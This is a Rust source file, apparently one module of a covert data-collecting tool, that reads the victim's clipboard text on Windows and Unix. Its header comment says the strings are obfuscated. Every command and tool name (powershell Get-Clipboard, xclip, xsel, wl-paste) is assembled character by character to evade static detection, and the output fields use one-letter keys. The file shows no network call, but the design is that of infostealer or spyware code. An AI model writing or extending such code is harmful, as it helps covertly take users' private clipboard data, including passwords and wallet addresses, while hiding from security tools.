//! Coletor de Área de Transferência
//!
//! ⚠️ Strings ofuscadas

use std::hint::black_box;
use serde::{Deserialize, Serialize};
use std::process::Command;

use super::{Collector, CollectorError, ModuleData};

#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClipboardData {
    #[serde(rename = "t")]
    pub current_text: Option<String>,
    
    #[serde(rename = "c")]
    pub collected_at: String,
    
    #[serde(rename = "y")]
    pub content_type: String,
    
    #[serde(rename = "s")]
    pub size_bytes: usize,
}

pub struct ClipboardCollector;

impl ClipboardCollector {
    pub fn new() -> Self {
        Self
    }
    
    fn collect_clipboard(&self) -> Result<ClipboardData, CollectorError> {
        let content = self.get_clipboard_text()?;
        
        let size = content.as_ref().map(|s| s.len()).unwrap_or(0);
        
        Ok(ClipboardData {
            current_text: content.map(|s| {
                if s.len() > 4096 {
                    format!("{}...", &s[..4096])
                } else {
                    s
                }
            }),
            collected_at: chrono::Utc::now().to_rfc3339(),
            content_type: bs(&['t', '/', 'p']),
            size_bytes: size,
        })
    }
    
    #[cfg(windows)]
    fn get_clipboard_text(&self) -> Result<Option<String>, CollectorError> {
        // powershell
        let ps = bs(&['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l']);
        // Get-Clipboard
        let gc = bs(&['G', 'e', 't', '-', 'C', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']);
        
        let output = Command::new(&ps)
            .args([bs(&['-', 'C', 'o', 'm', 'm', 'a', 'n', 'd']).as_str(), &gc])
            .output()?;
        
        if output.status.success() {
            let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if text.is_empty() {
                Ok(None)
            } else {
                Ok(Some(text))
            }
        } else {
            Ok(None)
        }
    }
    
    #[cfg(unix)]
    fn get_clipboard_text(&self) -> Result<Option<String>, CollectorError> {
        // Ferramentas construídas em runtime
        let tools = [
            (bs(&['x', 'c', 'l', 'i', 'p']), vec![
                bs(&['-', 's', 'e', 'l', 'e', 'c', 't', 'i', 'o', 'n']),
                bs(&['c', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']),
                bs(&['-', 'o']),
            ]),
            (bs(&['x', 's', 'e', 'l']), vec![
                bs(&['-', '-', 'c', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']),
                bs(&['-', '-', 'o', 'u', 't', 'p', 'u', 't']),
            ]),
            (bs(&['w', 'l', '-', 'p', 'a', 's', 't', 'e']), vec![]),
        ];
        
        for (tool, args) in tools {
            let args_ref: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
            if let Ok(output) = Command::new(&tool).args(&args_ref).output() {
                if output.status.success() {
                    let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
                    if !text.is_empty() {
                        return Ok(Some(text));
                    }
                }
            }
        }
        
        Ok(None)
    }
}

impl Default for ClipboardCollector {
    fn default() -> Self {
        Self::new()
    }
}

impl Collector for ClipboardCollector {
    fn name(&self) -> &str {
        "c"
    }
    
    fn collect(&self) -> Result<ModuleData, CollectorError> {
        let data = self.collect_clipboard()?;
        Ok(ModuleData::Clipboard(data))
    }
    
    fn is_supported(&self) -> bool {
        #[cfg(windows)]
        return true;
        
        #[cfg(unix)]
        {
            let w = bs(&['w', 'h', 'i', 'c', 'h']);
            let tools = [
                bs(&['x', 'c', 'l', 'i', 'p']),
                bs(&['x', 's', 'e', 'l']),
                bs(&['w', 'l', '-', 'p', 'a', 's', 't', 'e']),
            ];
            
            for tool in tools {
                if Command::new(&w).arg(&tool).output().map(|o| o.status.success()).unwrap_or(false) {
                    return true;
                }
            }
            false
        }
    }
    
    fn priority(&self) -> u8 {
        50
    }
}
